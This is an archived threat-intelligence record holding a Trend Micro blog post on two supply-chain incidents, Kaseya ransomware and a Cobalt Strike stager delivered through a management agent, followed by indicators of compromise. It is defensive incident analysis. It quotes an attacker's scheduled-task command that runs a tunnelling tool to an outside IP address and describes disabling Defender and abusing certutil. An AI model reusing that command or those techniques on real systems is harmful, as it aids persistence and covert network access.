{
    "id": "67e16d26-4881-4e01-85d9-336efbbbbc3e",
    "created_at": "2023-01-12T15:08:01.012861Z",
    "updated_at": "2025-03-27T02:05:39.841992Z",
    "deleted_at": null,
    "sha1_hash": "082b8d31f5c4d6f966eb8678f597ef94dd70df4c",
    "title": "2021-08-04 - Supply Chain Attacks from a Managed Detection and Response Perspective",
    "authors": "",
    "file_creation_date": "2022-05-28T15:27:11Z",
    "file_modification_date": "2022-05-28T15:27:11Z",
    "file_size": 715731,
    "plain_text": "# Supply Chain Attacks from a Managed Detection and Response Perspective\n\n**[trendmicro.com/en_us/research/21/h/supply-chain-attacks-from-a-managed-detection-and-response-persp.html](https://www.trendmicro.com/en_us/research/21/h/supply-chain-attacks-from-a-managed-detection-and-response-persp.html)**\n\nAugust 4, 2021\n\nFigure 1. The timeline of the incident\n\n## Introduction\n\nModern technology has made managing large IT environments much less daunting compared to the past, when each endpoint\nhad to be manually configured and maintained. Many organizations now use tools and IT solutions that allow centralized\nmanagement of endpoints, making it possible to update, troubleshoot, and deploy applications from a remote location.\n\nHowever, this convenience comes at a price — just as IT staff can access machines from a single location, the centralized nature\nof modern tech infrastructure also means that malicious actors can target the primary hub to gain access to the whole system.\nEven more concerning, cybercriminals no longer even have to launch a direct attack against an organization — they can bypass\n[security measures by focusing on their target’s supply chain. For example, instead of trying to find weak points in the system of a](https://www.trendmicro.com/vinfo/ph/security/news/virtualization-and-cloud/supply-chain-attacks-cloud-computing)\nlarge organization that will likely have strong defenses, an attacker can instead target smaller companies that develop software\nfor larger enterprises.\n\nIn this blog entry, we will take a look at two examples of supply chain attacks that our Managed Detection and Response (MDR)\nteam encountered in the past couple of months.\n\n## Incident #1: Attack on the Kaseya platform\n\n[On July 2, during the peak of the Kaseya ransomware incident, we alerted one of our customers, notifying them about](https://www.trendmicro.com/en_us/research/21/g/it-management-platform-kaseya-hit-with-sodinokibi-revil-ransomwa.html)\nransomware detections in their system.\n\nOur investigation found suspicious activity when the file AgentMon.exe, which is part of the Kaseya Agent, spawned another file,\ncmd.exe, that is responsible for creating the payload agent.exe, which in turn dropped MsMpEng.exe\n\nBy expanding our root cause analysis (RCA) and checking the argument for cmd.exe, we were able to see a few items before the\nexecution of the ransomware. These initial set of indicators of compromise (IoCs) are similar to the ones discussed in another\nblog post.\n\n\n-----\n\nFigure 2. Vision One console showing the attack’s infection chain\nWe found that the malware attempted to disable the anti-malware and anti-ransomware features of Windows Defender via\nPowerShell commands. It also created a copy of the Windows command line program Certutil.exe to “C:\\Windows\\cert.exe”,\nwhich is used to decode the payload file agent.crt, with the output given the name agent.exe. Agent.exe is then used to create\nthe file MsMpEng.exe, a version of Windows Defender that is vulnerable to DLL side-loading.\n\n\n-----\n\nFigure 3. Details of the threat\n\nMachine learning detection capabilities managed to block and detect the ransomware, however, the protection module was not\nactivated in all the security agents of Trend Micro Apex One™ — so the organization’s support requested the team to check their\nproduct settings. Because the process chain showed that the ransomware came from a Kaseya agent, we requested our\ncustomer to isolate the Kaseya servers to contain the threat.\n\nA few hours later, Kaseya released a notice to their users to immediately shut down their Virtual System/Server Administrator\n(VSA) server until further notice.\n\n## Incident #2: Credential dumping attack on the Active Directory\n\nThe second supply chain incident handled by our MDR team starts with an alert to a customer that notified them of a credential\ndump occurring in their active directory (AD). The Incident View in Trend Micro Vision One™ aggregated other detections into a\nsingle view, providing additional information on the scope of the threat. From there, we were able to see a server, an endpoint,\nand a user related to the threat.\n\nFigure 4. Vision One’s incident view showing the threat’s details\nOur threat hunting team also noted suspicious behavior related to WmiExec. Further investigation of the affected hosts’\nOwnership Alignment Tools (OATs) show a related entry for persistence:\n\n\n-----\n\nC:\\Windows\\System32\\schtasks.exe /CREATE /RU SYSTEM /SC HOURLY /TN Windows Defender /TR powershell.exe\nC:\\Windows\\System.exe -L rtcp://0.0.0.0:1035/127.0.0.1:25 -F mwss://52.149.228.45:443\" /ST 12:00\n\nFigure 5. OAT flagging a suspicious creation of a scheduled task\nWe found scheduled tasks being utilized as a persistence mechanism for the file System.exe. Further analysis of this file shows\nthat it is related to [GO simple tunnel, which is used to forward network traffic to an IP address depending on the argument.](https://github.com/ginuerzh/gost)\n\nChecking the initial alert revealed a file common in the two hosts, which prompted us to check the IOC list to determine the other\naffected hosts in the environment.\n\nFigure 6. Discovery commands and access to a malicious domain evident in the process chain\nExpanding the nodes from the RCA allowed us to gather additional IOCs that showed setup0.exe creating the file\nelevateutils.exe. In addition, elevateutils.exe was seen querying the domain vmware[.]center, which is possibly the threat’s\ncommand-and-control (C&C) server. We also discovered the earliest instance of setup0.exe in one of the hosts.\n\nThe samples setup0.exe is an installer for elevateutils.exe which seems to be a Cobalt Strike Beacon Malleable C&C stager\nbased on our analysis. The installer may have been used to masquerade as a normal file installation.\n\n\n-----\n\nFigure 7. The presence of\n\nEICAR strings is an indicator of it being of elevateutils.exe being a Cobalt Strike Beacon\nThe stager elevateutils.exe: will try to load the DLL chartdir60.dll, which will in turn read the contents of manual.pdf (these are\nalso dropped by the installer in the same directory as elevateutil.exe). It will then decrypt, load, and execute a shell code in\nmemory that will access the URL vmware[.]center/mV6c.\n\nIt makes use of VirtualAlloc, VirtualProtect, CreateThread, and a function to decrypt the shellcode to load and execute in memory.\nIt also uses indirect API calls after decryption in a separate function, then uses JMP EAX to call the function as needed, which is\nnot a routine or behavior that a normal file should have.\n\nSince it’s possible that this is a Cobalt Strike Malleable C&C stager, further behaviors may be dependent on what is downloaded\nfrom the accessed URL. However, due to being inaccessible at the time of writing this blog post, we were unable to observe\nand/or verify other behaviors.\n\nUse of the Progressive RCA of Vision One allowed us to see how elevateutils.exe was created, as well as its behaviors. The\nmalicious file was deployed via a Desktop Central agent.\n\nFigure 8. Viewing the behaviors of elevateutils.exe\n\n\n-----\n\nFigure 9. The console showing the attack’s infection chain\nBased on these findings, our recommendation to the customer was to check the logon logs of the affected application to verify\nany suspicious usage of accounts during the time the threat was deployed.\n\nBy closely monitoring the environment, the threat was stopped after the credential dump. Furthermore, the IOCs (IP addresses\nand hashes) were added to the suspicious objects list to block them while waiting for detections. Further monitoring was done\nand no other suspicious behavior were seen.\n\n## Defending against supply chain attacks\n\nAs businesses become more interconnected, a successful supply chain attack has the potential to cause a significant amount of\ndamage to affected organizations. We can expect to see more of these in the future, as they often lead to the same results as a\ndirect attack while providing a wider attack surface for malicious actors to exploit.\n\nSupply chain attacks are difficult to track because the targeted organizations often do not have full access to what’s going on\nsecurity-wise with their supply chain partners. This can often be exacerbated by security lapses within the company itself. For\nexample, products and software may have configurations — such as folder exclusions and suboptimal implementation of\ndetection modules — that make threats more difficult to notice.\n\nSecurity audits are also a very important step in securing the supply chain. Even if third party vendors are known to be\ntrustworthy, security precautions should still be deployed in case there are compromised accounts or even insider threats.\n\n## Using Vision One to contain the threat\n\n[Trend Micro Vision One provides offers organizations the ability to detect and respond to threats across multiple security layers. It](https://www.trendmicro.com/en_ph/business/products/detection-response.html)\nprovides enterprises options to deal with threats such as the ones discussed in this blog entry:\n\nIt can Isolate endpoints, which are often the source of infection, until they are fully cleaned or the investigation is done.\nIt can block IOCs related to the threat, this includes hashes, IP addresses, or domains found during analysis.\nIt can collect files for further investigation.\n\nIndicators of Compromise (IoCs)\n\nIncident # 1\n\n**SHA256** **Detection name** **Details**\n\n8dd620d9aeb35960bb766458c8890ede987c33d239cf730f93fe49d90ae759dd Ransom.Win32.SODINOKIBI.YABGC mpsvc.dll\n\n\n-----\n\nd55f983c994caa160ec63a59f6b4250fe67fb3e8c43a388aec60a4a6978e9f1e Trojan.Win32.SODINSTALL.YABGC agent.exe\n\nIncident # 2\n\n**SHA256** **Detection name** **Details**\n\n5e0f28bd2d49b73e96a87f5c20283ebe030f4bb39b3107d4d68015dce862991d HackTool.Win64.Gost.A System.exe\n\n116af9afb2113fd96e35661df5def2728e169129bedd6b0bb76d12aaf88ba1ab Trojan.Win32.COBALT.AZ Setup0.exe\n\nf52679c0a6196494bde8b61326d753f86fa0f3fea9d601a1fc594cbf9d778b12 Trojan.Win32.COBALT.BA chartdir60.dll\n\nc59ad626d1479ffc4b6b0c02ca797900a09553e1c6ccfb7323fc1cf6e89a9556 Trojan.PDF.COBALT.AA manual.pdf\n\nf4f25ce8cb5825e0a0d76e82c54c25a2e76be3675b8eeb511e2e8a0012717006 Trojan.Win32.COBALT.BA elevateutils.exe\n\n### IP addresses and domains\n\n185[.]215[.]113[.]213\nvmware[.]center\n\nMalware\n\nIn this blog entry, we will take a look at two examples of supply chain attacks that our Managed Detection and Response (MDR)\nteam encountered in the past couple of months.\n\nBy: Ryan Maglaque, Jessie Prevost, Joelson Soares, Janus Agcaoili August 04, 2021 Read time: ( words)\n\nContent added to Folio\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-04 - Supply Chain Attacks from a Managed Detection and Response Perspective.pdf"
    ],
    "report_names": [
        "2021-08-04 - Supply Chain Attacks from a Managed Detection and Response Perspective.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536081,
    "ts_updated_at": 1743041139,
    "ts_creation_date": 1653751631,
    "ts_modification_date": 1653751631,
    "files": {
        "pdf": "https://archive.orkl.eu/082b8d31f5c4d6f966eb8678f597ef94dd70df4c.pdf",
        "text": "https://archive.orkl.eu/082b8d31f5c4d6f966eb8678f597ef94dd70df4c.txt",
        "img": "https://archive.orkl.eu/082b8d31f5c4d6f966eb8678f597ef94dd70df4c.jpg"
    }
}